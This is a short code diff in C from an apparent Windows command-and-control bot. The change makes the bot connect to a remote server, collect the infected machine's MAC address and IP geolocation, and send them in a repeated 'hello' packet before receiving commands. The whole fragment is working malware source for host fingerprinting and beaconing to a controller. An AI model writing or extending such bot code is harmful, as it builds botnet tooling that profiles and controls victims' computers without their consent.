@@ -4,6 +4,8 @@
 #include <winsock2.h>
 
 #include "c2-bot.h"
+#include "c2-packet.h"
+#include "c2-ipgeo.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -43,10 +45,14 @@ void BotConnection() {
 
     printf("Connect to server %s:%d success!\n", SERVER_IP, SERVER_PORT);
 
+    uint8_t mac[6];
+    get_mac_address(mac);
+    const char *ipgeo_json = ipgeo();
+
     while (1) {
-        // EXAMPLE SENT DATA
-        const char *message = "Hello, server!";
-        send(sock, message, strlen(message), 0);
+        if (hello_packet(sock, mac, ipgeo_json) < 0) {
+            printf("Failed to hello send packet\n");
+        }
 
         bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
         if (bytes_received < 0) {
